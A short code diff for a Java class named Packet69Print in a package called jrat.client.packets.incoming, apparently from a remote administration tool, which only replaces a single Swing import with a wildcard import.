@@ -1,7 +1,8 @@
 package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
-import javax.swing.JTextPane;
+
+import javax.swing.*;
 
 
 public class Packet69Print extends AbstractIncomingPacket {
